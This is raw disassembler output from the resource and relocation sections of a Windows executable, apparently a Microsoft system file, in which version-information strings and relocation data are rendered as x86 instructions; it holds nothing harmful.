  41629a:	pop    edi
  41629b:	add    BYTE PTR [ecx+0x0],cl
  41629e:	dec    esi
  41629f:	add    BYTE PTR [esi+0x0],al
  4162a2:	dec    edi
  4162a3:	add    BYTE PTR [eax],al
  4162a5:	add    BYTE PTR [eax],al
  4162a7:	add    BYTE PTR [ebp+0xfeef04],bh
  4162ad:	add    BYTE PTR [ecx],al
  4162af:	add    BYTE PTR [eax],al
  4162b1:	add    BYTE PTR [edx],cl
  4162b3:	add    BYTE PTR [eax],al
  4162b5:	inc    eax
  4162b6:	add    BYTE PTR [eax],ch
  4162b8:	add    BYTE PTR [eax],al
  4162ba:	or     al,BYTE PTR [eax]
  4162bc:	add    BYTE PTR [eax+0x0],al
  4162bf:	sub    BYTE PTR [edi],bh
  4162c1:	add    BYTE PTR [eax],al
  4162c3:	add    BYTE PTR [eax],al
  4162c5:	add    BYTE PTR [eax],al
  4162c7:	add    BYTE PTR [eax+eax*1],al
  4162ca:	add    al,0x0
  4162cc:	add    DWORD PTR [eax],eax
	...
  4162da:	add    BYTE PTR [eax],al
  4162dc:	push   esi
  4162dd:	add    eax,DWORD PTR [eax]
  4162df:	add    BYTE PTR [ecx],al
  4162e1:	add    BYTE PTR [ebx+0x0],dl
  4162e4:	je     0x4162e6
  4162e6:	jb     0x4162e8
  4162e8:	imul   eax,DWORD PTR [eax],0x67006e
  4162ee:	inc    esi
  4162ef:	add    BYTE PTR [ecx+0x0],ch
  4162f2:	ins    BYTE PTR es:[edi],dx
  4162f3:	add    BYTE PTR [ebp+0x0],ah
  4162f6:	dec    ecx
  4162f7:	add    BYTE PTR [esi+0x0],ch
  4162fa:	data16 add BYTE PTR [edi+0x0],ch
  4162fe:	add    BYTE PTR [eax],al
  416300:	xor    al,BYTE PTR [ebx]
  416302:	add    BYTE PTR [eax],al
  416304:	add    DWORD PTR [eax],eax
  416306:	xor    BYTE PTR [eax],al
  416308:	xor    al,0x0
  41630a:	xor    BYTE PTR [eax],al
  41630c:	cmp    DWORD PTR [eax],eax
  41630e:	xor    BYTE PTR [eax],al
  416310:	xor    al,0x0
  416312:	inc    edx
  416313:	add    BYTE PTR [eax],dh
  416315:	add    BYTE PTR [eax],al
  416317:	add    BYTE PTR [eax+eax*1+0x16],cl
  41631b:	add    BYTE PTR [ecx],al
  41631d:	add    BYTE PTR [ebx+0x0],al
  416320:	outs   dx,DWORD PTR ds:[esi]
  416321:	add    BYTE PTR [ebp+0x0],ch
  416324:	jo     0x416326
  416326:	popa   
  416327:	add    BYTE PTR [esi+0x0],ch
  41632a:	jns    0x41632c
  41632c:	dec    esi
  41632d:	add    BYTE PTR [ecx+0x0],ah
  416330:	ins    DWORD PTR es:[edi],dx
  416331:	add    BYTE PTR [ebp+0x0],ah
  416334:	add    BYTE PTR [eax],al
  416336:	add    BYTE PTR [eax],al
  416338:	dec    ebp
  416339:	add    BYTE PTR [ecx+0x0],ch
  41633c:	arpl   WORD PTR [eax],ax
  41633e:	jb     0x416340
  416340:	outs   dx,DWORD PTR ds:[esi]
  416341:	add    BYTE PTR [ebx+0x0],dh
  416344:	outs   dx,DWORD PTR ds:[esi]
  416345:	add    BYTE PTR [esi+0x0],ah
  416348:	je     0x41634a
  41634a:	and    BYTE PTR [eax],al
  41634c:	inc    ebx
  41634d:	add    BYTE PTR [edi+0x0],ch
  416350:	jb     0x416352
  416352:	jo     0x416354
  416354:	outs   dx,DWORD PTR ds:[esi]
  416355:	add    BYTE PTR [edx+0x0],dh
  416358:	popa   
  416359:	add    BYTE PTR [eax+eax*1+0x69],dh
  41635d:	add    BYTE PTR [edi+0x0],ch
  416360:	outs   dx,BYTE PTR ds:[esi]
  416361:	add    BYTE PTR [eax],al
  416363:	add    BYTE PTR [edx+0x0],dh
  416366:	and    eax,0x46000100
  41636b:	add    BYTE PTR [ecx+0x0],ch
  41636e:	ins    BYTE PTR es:[edi],dx
  41636f:	add    BYTE PTR [ebp+0x0],ah
  416372:	inc    esp
  416373:	add    BYTE PTR [ebp+0x0],ah
  416376:	jae    0x416378
  416378:	arpl   WORD PTR [eax],ax
  41637a:	jb     0x41637c
  41637c:	imul   eax,DWORD PTR [eax],0x740070
  416382:	imul   eax,DWORD PTR [eax],0x6e006f
  416388:	add    BYTE PTR [eax],al
  41638a:	add    BYTE PTR [eax],al
  41638c:	inc    ebx
  41638d:	add    BYTE PTR [eax+0x0],ch
  416390:	popa   
  416391:	add    BYTE PTR [esi+0x0],ch
  416394:	add    BYTE PTR [di+0x0],ah
  416398:	and    BYTE PTR [eax],al
  41639a:	inc    ebx
  41639b:	add    BYTE PTR [edi+0x0],ch
  41639e:	ins    DWORD PTR es:[edi],dx
  41639f:	add    BYTE PTR [eax+0x0],dh
  4163a2:	jne    0x4163a4
  4163a4:	je     0x4163a6
  4163a6:	add    BYTE PTR gs:[edx+0x0],dh
  4163aa:	and    BYTE PTR [eax],al
  4163ac:	push   eax
  4163ad:	add    BYTE PTR [ebp+0x0],ah
  4163b0:	jb     0x4163b2
  4163b2:	data16 add BYTE PTR [edi+0x0],ch
  4163b6:	jb     0x4163b8
  4163b8:	ins    DWORD PTR es:[edi],dx
  4163b9:	add    BYTE PTR [ecx+0x0],ah
  4163bc:	outs   dx,BYTE PTR ds:[esi]
  4163bd:	add    BYTE PTR [ebx+0x0],ah
  4163c0:	add    BYTE PTR gs:[eax],ah
  4163c3:	add    BYTE PTR [ebx+0x0],dl
  4163c6:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  4163cb:	add    BYTE PTR [ecx+0x0],ch
  4163ce:	outs   dx,BYTE PTR ds:[esi]
  4163cf:	add    BYTE PTR [edi+0x0],ah
  4163d2:	jae    0x4163d4
  4163d4:	add    BYTE PTR [eax],al
  4163d6:	add    BYTE PTR [eax],al
  4163d8:	data16 add BYTE PTR [ebx],ah
  4163db:	add    BYTE PTR [ecx],al
  4163dd:	add    BYTE PTR [esi+0x0],al
  4163e0:	imul   eax,DWORD PTR [eax],0x65006c
  4163e6:	push   esi
  4163e7:	add    BYTE PTR [ebp+0x0],ah
  4163ea:	jb     0x4163ec
  4163ec:	jae    0x4163ee
  4163ee:	imul   eax,DWORD PTR [eax],0x6e006f
  4163f4:	add    BYTE PTR [eax],al
  4163f6:	add    BYTE PTR [eax],al
  4163f8:	xor    DWORD PTR [eax],eax
  4163fa:	xor    BYTE PTR [eax],al
  4163fc:	add    BYTE PTR cs:[eax],dh
  4163ff:	add    BYTE PTR [esi],ch
  416401:	add    BYTE PTR [ecx],dh
  416403:	add    BYTE PTR [eax],dh
  416405:	add    BYTE PTR [edx],dh
  416407:	add    BYTE PTR [eax+eax*1],dh
  41640a:	xor    BYTE PTR [eax],al
  41640c:	add    BYTE PTR cs:[ecx],dh
  41640f:	add    BYTE PTR [esi],dh
  416411:	add    BYTE PTR [ebx],dh
  416413:	add    BYTE PTR [eax],bh
  416415:	add    BYTE PTR [eax+eax*1],dh
  416418:	and    BYTE PTR [eax],al
  41641a:	sub    BYTE PTR [eax],al
  41641c:	je     0x41641e
  41641e:	push   0x2e003100
  416423:	add    BYTE PTR [ecx],dh
  416425:	add    BYTE PTR ds:0x37003000,dh
  41642b:	add    BYTE PTR [eax],dh
  41642d:	add    BYTE PTR [ecx],bh
  41642f:	add    BYTE PTR ds:0x37003100,ch
  416435:	add    BYTE PTR [eax],dh
  416437:	add    BYTE PTR [eax],dh
  416439:	add    BYTE PTR [ecx],ch
  41643b:	add    BYTE PTR [eax],al
  41643d:	add    BYTE PTR [eax],al
  41643f:	add    BYTE PTR [eax+0x0],bl
  416442:	sbb    al,0x0
  416444:	add    DWORD PTR [eax],eax
  416446:	dec    ecx
  416447:	add    BYTE PTR [esi+0x0],ch
  41644a:	je     0x41644c
  41644c:	add    BYTE PTR gs:[edx+0x0],dh
  416450:	outs   dx,BYTE PTR ds:[esi]
  416451:	add    BYTE PTR [ecx+0x0],ah
  416454:	ins    BYTE PTR es:[edi],dx
  416455:	add    BYTE PTR [esi+0x0],cl
  416458:	popa   
  416459:	add    BYTE PTR [ebp+0x0],ch
  41645c:	add    BYTE PTR gs:[eax],al
  41645f:	add    BYTE PTR [ebx+0x0],dl
  416462:	jns    0x416464
  416464:	jae    0x416466
  416466:	je     0x416468
  416468:	add    BYTE PTR gs:[ebp+0x0],ch
  41646c:	push   eax
  41646d:	add    BYTE PTR [edx+0x0],dh
  416470:	outs   dx,DWORD PTR ds:[esi]
  416471:	add    BYTE PTR [eax+0x0],dh
  416474:	add    BYTE PTR gs:[edx+0x0],dh
  416478:	je     0x41647a
  41647a:	imul   eax,DWORD PTR [eax],0x730065
  416480:	push   eax
  416481:	add    BYTE PTR [ebp+0x0],ah
  416484:	jb     0x416486
  416486:	data16 add BYTE PTR [edi+0x0],ch
  41648a:	jb     0x41648c
  41648c:	ins    DWORD PTR es:[edi],dx
  41648d:	add    BYTE PTR [ecx+0x0],ah
  416490:	outs   dx,BYTE PTR ds:[esi]
  416491:	add    BYTE PTR [ebx+0x0],ah
  416494:	add    BYTE PTR gs:[eax],al
  416497:	add    BYTE PTR [eax+0x1002e00],al
  41649d:	add    BYTE PTR [eax+eax*1+0x65],cl
  4164a1:	add    BYTE PTR [edi+0x0],ah
  4164a4:	popa   
  4164a5:	add    BYTE PTR [eax+eax*1+0x43],ch
  4164a9:	add    BYTE PTR [edi+0x0],ch
  4164ac:	jo     0x4164ae
  4164ae:	jns    0x4164b0
  4164b0:	jb     0x4164b2
  4164b2:	imul   eax,DWORD PTR [eax],0x680067
  4164b8:	je     0x4164ba
  4164ba:	add    BYTE PTR [eax],al
  4164bc:	test   eax,0x4d002000
  4164c1:	add    BYTE PTR [ecx+0x0],ch
  4164c4:	arpl   WORD PTR [eax],ax
  4164c6:	jb     0x4164c8
  4164c8:	outs   dx,DWORD PTR ds:[esi]
  4164c9:	add    BYTE PTR [ebx+0x0],dh
  4164cc:	outs   dx,DWORD PTR ds:[esi]
  4164cd:	add    BYTE PTR [esi+0x0],ah
  4164d0:	je     0x4164d2
  4164d2:	and    BYTE PTR [eax],al
  4164d4:	inc    ebx
  4164d5:	add    BYTE PTR [edi+0x0],ch
  4164d8:	jb     0x4164da
  4164da:	jo     0x4164dc
  4164dc:	outs   dx,DWORD PTR ds:[esi]
  4164dd:	add    BYTE PTR [edx+0x0],dh
  4164e0:	popa   
  4164e1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4164e5:	add    BYTE PTR [edi+0x0],ch
  4164e8:	outs   dx,BYTE PTR ds:[esi]
  4164e9:	add    BYTE PTR [esi],ch
  4164eb:	add    BYTE PTR [eax],ah
  4164ed:	add    BYTE PTR [ecx+0x0],al
  4164f0:	ins    BYTE PTR es:[edi],dx
  4164f1:	add    BYTE PTR [eax+eax*1+0x20],ch
  4164f5:	add    BYTE PTR [edx+0x0],dh
  4164f8:	imul   eax,DWORD PTR [eax],0x680067
  4164fe:	je     0x416500
  416500:	jae    0x416502
  416502:	and    BYTE PTR [eax],al
  416504:	jb     0x416506
  416506:	add    BYTE PTR gs:[ebx+0x0],dh
  41650a:	add    BYTE PTR gs:[edx+0x0],dh
  41650e:	jbe    0x416510
  416510:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  416515:	add    BYTE PTR [eax],al
  416517:	add    BYTE PTR [eax+0x0],ch
  41651a:	and    BYTE PTR [eax],al
  41651c:	add    DWORD PTR [eax],eax
  41651e:	dec    edi
  41651f:	add    BYTE PTR [edx+0x0],dh
  416522:	imul   eax,DWORD PTR [eax],0x690067
  416528:	outs   dx,BYTE PTR ds:[esi]
  416529:	add    BYTE PTR [ecx+0x0],ah
  41652c:	ins    BYTE PTR es:[edi],dx
  41652d:	add    BYTE PTR [esi+0x0],al
  416530:	imul   eax,DWORD PTR [eax],0x65006c
  416536:	outs   dx,BYTE PTR ds:[esi]
  416537:	add    BYTE PTR [ecx+0x0],ah
  41653a:	ins    DWORD PTR es:[edi],dx
  41653b:	add    BYTE PTR [ebp+0x0],ah
  41653e:	add    BYTE PTR [eax],al
  416540:	push   ebx
  416541:	add    BYTE PTR [ecx+0x0],bh
  416544:	jae    0x416546
  416546:	je     0x416548
  416548:	add    BYTE PTR gs:[ebp+0x0],ch
  41654c:	push   eax
  41654d:	add    BYTE PTR [edx+0x0],dh
  416550:	outs   dx,DWORD PTR ds:[esi]
  416551:	add    BYTE PTR [eax+0x0],dh
  416554:	add    BYTE PTR gs:[edx+0x0],dh
  416558:	je     0x41655a
  41655a:	imul   eax,DWORD PTR [eax],0x730065
  416560:	push   eax
  416561:	add    BYTE PTR [ebp+0x0],ah
  416564:	jb     0x416566
  416566:	data16 add BYTE PTR [edi+0x0],ch
  41656a:	jb     0x41656c
  41656c:	ins    DWORD PTR es:[edi],dx
  41656d:	add    BYTE PTR [ecx+0x0],ah
  416570:	outs   dx,BYTE PTR ds:[esi]
  416571:	add    BYTE PTR [ebx+0x0],ah
  416574:	add    BYTE PTR gs:[esi],ch
  416577:	add    BYTE PTR [ebp+0x0],al
  41657a:	pop    eax
  41657b:	add    BYTE PTR [ebp+0x0],al
  41657e:	add    BYTE PTR [eax],al
  416580:	push   0x0
  416582:	and    eax,0x50000100
  416587:	add    BYTE PTR [edx+0x0],dh
  41658a:	outs   dx,DWORD PTR ds:[esi]
  41658b:	add    BYTE PTR [eax+eax*1+0x75],ah
  41658f:	add    BYTE PTR [ebx+0x0],ah
  416592:	je     0x416594
  416594:	dec    esi
  416595:	add    BYTE PTR [ecx+0x0],ah
  416598:	ins    DWORD PTR es:[edi],dx
  416599:	add    BYTE PTR [ebp+0x0],ah
  41659c:	add    BYTE PTR [eax],al
  41659e:	add    BYTE PTR [eax],al
  4165a0:	dec    ebp
  4165a1:	add    BYTE PTR [ecx+0x0],ch
  4165a4:	arpl   WORD PTR [eax],ax
  4165a6:	jb     0x4165a8
  4165a8:	outs   dx,DWORD PTR ds:[esi]
  4165a9:	add    BYTE PTR [ebx+0x0],dh
  4165ac:	outs   dx,DWORD PTR ds:[esi]
  4165ad:	add    BYTE PTR [esi+0x0],ah
  4165b0:	je     0x4165b2
  4165b2:	scas   al,BYTE PTR es:[edi]
  4165b3:	add    BYTE PTR [eax],ah
  4165b5:	add    BYTE PTR [edi+0x0],dl
  4165b8:	imul   eax,DWORD PTR [eax],0x64006e
  4165be:	outs   dx,DWORD PTR ds:[esi]
  4165bf:	add    BYTE PTR [edi+0x0],dh
  4165c2:	jae    0x4165c4
  4165c4:	scas   al,BYTE PTR es:[edi]
  4165c5:	add    BYTE PTR [eax],ah
  4165c7:	add    BYTE PTR [edi+0x0],cl
  4165ca:	jo     0x4165cc
  4165cc:	add    BYTE PTR gs:[edx+0x0],dh
  4165d0:	popa   
  4165d1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4165d5:	add    BYTE PTR [esi+0x0],ch
  4165d8:	add    BYTE PTR [bx+si],ah
  4165db:	add    BYTE PTR [ebx+0x0],dl
  4165de:	jns    0x4165e0
  4165e0:	jae    0x4165e2
  4165e2:	je     0x4165e4
  4165e4:	add    BYTE PTR gs:[ebp+0x0],ch
  4165e8:	add    BYTE PTR [eax],al
  4165ea:	add    BYTE PTR [eax],al
  4165ec:	inc    esi
  4165ed:	add    BYTE PTR [ecx],dl
  4165ef:	add    BYTE PTR [ecx],al
  4165f1:	add    BYTE PTR [eax+0x0],dl
  4165f4:	jb     0x4165f6
  4165f6:	outs   dx,DWORD PTR ds:[esi]
  4165f7:	add    BYTE PTR [eax+eax*1+0x75],ah
  4165fb:	add    BYTE PTR [ebx+0x0],ah
  4165fe:	je     0x416600
  416600:	push   esi
  416601:	add    BYTE PTR [ebp+0x0],ah
  416604:	jb     0x416606
  416606:	jae    0x416608
  416608:	imul   eax,DWORD PTR [eax],0x6e006f
  41660e:	add    BYTE PTR [eax],al
  416610:	xor    DWORD PTR [eax],eax
  416612:	xor    BYTE PTR [eax],al
  416614:	add    BYTE PTR cs:[eax],dh
  416617:	add    BYTE PTR [esi],ch
  416619:	add    BYTE PTR [ecx],dh
  41661b:	add    BYTE PTR [eax],dh
  41661d:	add    BYTE PTR [edx],dh
  41661f:	add    BYTE PTR [eax+eax*1],dh
  416622:	xor    BYTE PTR [eax],al
  416624:	add    BYTE PTR cs:[ecx],dh
  416627:	add    BYTE PTR [esi],dh
  416629:	add    BYTE PTR [ebx],dh
  41662b:	add    BYTE PTR [eax],bh
  41662d:	add    BYTE PTR [eax+eax*1],dh
  416630:	add    BYTE PTR [eax],al
  416632:	add    BYTE PTR [eax],al
  416634:	inc    esp
  416635:	add    BYTE PTR [eax],al
  416637:	add    BYTE PTR [ecx],al
  416639:	add    BYTE PTR [esi+0x0],dl
  41663c:	popa   
  41663d:	add    BYTE PTR [edx+0x0],dh
  416640:	inc    esi
  416641:	add    BYTE PTR [ecx+0x0],ch
  416644:	ins    BYTE PTR es:[edi],dx
  416645:	add    BYTE PTR [ebp+0x0],ah
  416648:	dec    ecx
  416649:	add    BYTE PTR [esi+0x0],ch
  41664c:	data16 add BYTE PTR [edi+0x0],ch
  416650:	add    BYTE PTR [eax],al
  416652:	add    BYTE PTR [eax],al
  416654:	and    al,0x0
  416656:	add    al,0x0
  416658:	add    BYTE PTR [eax],al
  41665a:	push   esp
  41665b:	add    BYTE PTR [edx+0x0],dh
  41665e:	popa   
  41665f:	add    BYTE PTR [esi+0x0],ch
  416662:	jae    0x416664
  416664:	ins    BYTE PTR es:[edi],dx
  416665:	add    BYTE PTR [ecx+0x0],ah
  416668:	je     0x41666a
  41666a:	imul   eax,DWORD PTR [eax],0x6e006f
  416670:	add    BYTE PTR [eax],al
  416672:	add    BYTE PTR [eax],al
  416674:	or     DWORD PTR [eax+esi*4],eax
  416677:	add    al,0xcd
  416679:	dec    ch
  41667b:	(bad)  
  41667c:	rol    BYTE PTR [eax],1
  41667e:	add    BYTE PTR [eax],al
  416680:	add    BYTE PTR [eax],al
  416682:	add    DWORD PTR [eax],eax
  416684:	add    BYTE PTR [eax],al
  416686:	add    BYTE PTR [eax],al
  416688:	adc    DWORD PTR [eax],eax
  41668a:	add    BYTE PTR [eax],al
  41668c:	add    BYTE PTR [eax],al
  41668e:	add    BYTE PTR [eax],al
  416690:	add    al,BYTE PTR [eax]
  416692:	add    BYTE PTR [eax],al
  416694:	mov    DWORD PTR [ecx+0x79],0xf52fc6c6
  41669b:	sub    esp,esp
  41669d:	int3   
  41669e:	cmc    
  41669f:	xchg   ecx,eax
  4166a0:	adc    eax,0x7bb4bedf
  4166a5:	out    dx,al
  4166a6:	shl    DWORD PTR [edi+0xc],cl
  4166a9:	fnstsw WORD PTR [esi+0x47]
  4166ac:	or     cl,BYTE PTR [esi-0x6f]
  4166af:	pop    ebp
  4166b0:	inc    ebp
  4166b1:	mov    bl,0x4d
  4166b3:	test   DWORD PTR [eax],eax
	...
  4166c9:	add    BYTE PTR [eax],al
  4166cb:	add    BYTE PTR [eax+0xe000000],cl
  4166d1:	add    BYTE PTR [eax],al
  4166d3:	add    BYTE PTR [eax+0x10000000],bl
  4166d9:	add    BYTE PTR [eax],al
  4166db:	add    BYTE PTR [eax+0xe000000],ch
  4166e1:	add    BYTE PTR [eax],al
  4166e3:	add    BYTE PTR [eax+0x8000000],bh
	...
  4166f1:	add    BYTE PTR [eax],al
  4166f3:	add    al,al
  4166f5:	add    BYTE PTR [eax],al
  4166f7:	add    BYTE PTR [eax+eax*1],cl
  4166fa:	add    BYTE PTR [eax],al
  4166fc:	add    BYTE PTR [eax],al
  4166fe:	add    BYTE PTR [eax],al
  416700:	dec    ebp
  416701:	add    BYTE PTR [ebp+0x0],dl
  416704:	dec    ecx
	...
  41670d:	add    BYTE PTR [eax],al
  41670f:	add    BYTE PTR [ebx],al
  416711:	add    BYTE PTR [eax],al
  416713:	add    BYTE PTR [esi],cl
  416715:	add    BYTE PTR [eax],al
  416717:	add    BYTE PTR [eax],dl
  416719:	add    BYTE PTR [eax],al
  41671b:	add    BYTE PTR [eax],bl
  41671d:	add    BYTE PTR [eax],al
  41671f:	add    BYTE PTR [ebp+0x0],cl
  416722:	push   ebp
  416723:	add    BYTE PTR [ecx+0x0],cl
	...
  41672e:	add    BYTE PTR [eax],al
  416730:	push   es
  416731:	add    BYTE PTR [eax],al
  416733:	add    BYTE PTR [eax],dl
  416735:	add    BYTE PTR [eax],al
  416737:	add    BYTE PTR [ebp+0x0],ah
  41673a:	outs   dx,BYTE PTR ds:[esi]
  41673b:	add    BYTE PTR ds:0x53005500,ch
  416741:	add    BYTE PTR [eax],al
  416743:	add    BYTE PTR [eax],al
  416745:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00417000 <.reloc>:
  417000:	add    BYTE PTR [eax],dl
  417002:	add    BYTE PTR [eax],al
  417004:	xor    al,0x1
  417006:	add    BYTE PTR [eax],al
  417008:	add    al,0x30
  41700a:	adc    BYTE PTR [eax],dh
  41700c:	adc    al,0x30
  41700e:	inc    eax
  41700f:	xor    BYTE PTR [eax+esi*1+0x14],al
  417013:	xor    DWORD PTR [eax],ebx
  417015:	xor    DWORD PTR [eax],esp
  417017:	xor    DWORD PTR [eax],ebp
  417019:	xor    DWORD PTR [edi+0x33],ebp
  41701c:	jp     0x417051
  41701e:	test   BYTE PTR [ebx],dh
  417020:	mov    esi,DWORD PTR [ebx]
  417022:	xchg   ecx,eax
  417023:	xor    ebp,DWORD PTR [eax-0x45cc4bcd]
  417029:	xor    eax,edi
  41702b:	xor    ebx,ebp
  41702d:	xor    esp,esi
  41702f:	xor    esi,eax
  417031:	xor    edi,ecx
  417033:	xor    eax,DWORD PTR [ebx]
  417035:	xor    al,0xf
  417037:	xor    al,0x15
  417039:	xor    al,0x1c
  41703b:	xor    al,0x25
  41703d:	xor    al,0x2b
  41703f:	xor    al,0x33
  417041:	xor    al,0x39
  417043:	xor    al,0x46
  417045:	xor    al,0x4e
  417047:	xor    al,0x54
  417049:	xor    al,0x71
  41704b:	xor    al,0x76
  41704d:	xor    al,0x7c
  41704f:	xor    al,0x81
  417051:	xor    al,0x86
  417053:	xor    al,0x8b
  417055:	xor    al,0x90
  417057:	xor    al,0x96
  417059:	xor    al,0x9e
  41705b:	xor    al,0xab
  41705d:	xor    al,0xc2
  41705f:	xor    al,0xdf
  417061:	xor    al,0xf7
  417063:	xor    al,0xe
  417065:	xor    eax,0x351f3516
  41706a:	and    al,0x35
  41706c:	sub    DWORD PTR ds:0x3545353f,esi
  417072:	dec    esp
  417073:	xor    eax,0x355e3551
  417078:	ins    DWORD PTR es:[edi],dx
  417079:	xor    eax,0x357d3575
  41707e:	xchg   ebx,eax
  41707f:	xor    eax,0x35a2359b
  417084:	repz xor eax,0x360335fd
  41708a:	or     eax,0x4b364536
  41708f:	ss push ebp
  417091:	ss pop ebx
  417093:	ss fs imul esi,DWORD PTR ss:[esi],0x36be369b
  41709c:	add    dh,BYTE PTR [edi]
  41709e:	pop    ecx
  41709f:	aaa    
  4170a0:	jno    0x4170d9
  4170a2:	ja     0x4170db
  4170a4:	xchg   BYTE PTR [edi],dh
  4170a6:	xchg   edx,eax
  4170a7:	aaa    
  4170a8:	pop    es
  4170a9:	cmp    BYTE PTR [eax+edi*1],bh
  4170ac:	mov    eax,0xcf38bd38
  4170b1:	cmp    ch,ch
  4170b3:	cmp    BYTE PTR [ecx],al
  4170b5:	cmp    DWORD PTR [edi],eax
  4170b7:	cmp    ecx,ecx
  4170b9:	cmp    esp,esp
  4170bb:	cmp    eax,esi
  4170bd:	cmp    edi,edi
  4170bf:	cmp    DWORD PTR [eax],ecx
  4170c1:	cmp    dl,BYTE PTR [ecx]
  4170c3:	cmp    ah,BYTE PTR [esi]
  4170c5:	cmp    bh,BYTE PTR [ebx]
  4170c7:	cmp    cl,BYTE PTR [eax+0x3a]
  4170ca:	push   eax
  4170cb:	cmp    ch,BYTE PTR [ebx+0x3a]
  4170ce:	jp     0x41710a
  4170d0:	test   DWORD PTR [edx],edi
  4170d2:	mov    ds:0xf73af23a,al
  4170d7:	cmp    bl,BYTE PTR [edi]
  4170d9:	cmp    ebp,DWORD PTR [eax]
  4170db:	cmp    esi,DWORD PTR [ebx]
  4170dd:	cmp    edi,DWORD PTR [edx]
  4170df:	cmp    edx,DWORD PTR [ecx+0x3b]
  4170e2:	push   edi
  4170e3:	cmp    ebx,DWORD PTR [ebp+0x3b]
  4170e6:	arpl   WORD PTR [ebx],di
  4170e8:	imul   edi,DWORD PTR [ebx],0x3b763b6f
  4170ee:	jge    0x41712b
  4170f0:	test   BYTE PTR [ebx],bh
  4170f2:	mov    edi,DWORD PTR [ebx]
  4170f4:	xchg   edx,eax
  4170f5:	cmp    ebx,DWORD PTR [ecx-0x57c45fc5]
  4170fb:	cmp    esi,DWORD PTR [eax-0x3bc447c5]
  417101:	cmp    ecx,ebp
  417103:	cmp    edx,edx
  417105:	cmp    ebx,eax
  417107:	cmp    esp,edx
  417109:	cmp    ebp,esp
  41710b:	cmp    edi,esp
  41710d:	cmp    ecx,DWORD PTR [esp+edi*1]
  417110:	adc    bh,BYTE PTR [ebx*1+0x2f3c233c]
  417117:	cmp    al,0x3f
  417119:	cmp    al,0x48
  41711b:	cmp    al,0x5d
  41711d:	cmp    al,0x7a
  41711f:	cmp    al,0xbc
  417121:	cmp    al,0xd4
  417123:	cmp    al,0xd8
  417125:	cmp    al,0xe0
  417127:	cmp    al,0xe4
  417129:	cmp    al,0xfc
  41712b:	cmp    al,0x0
  41712d:	cmp    eax,0x3d203d1c
  417132:	add    BYTE PTR [eax],al
  417134:	add    BYTE PTR [eax],dh
  417136:	add    BYTE PTR [eax],al
  417138:	or     al,0x0
  41713a:	add    BYTE PTR [eax],al
  41713c:	cwde   
  41713d:	xor    BYTE PTR [eax],al
	...
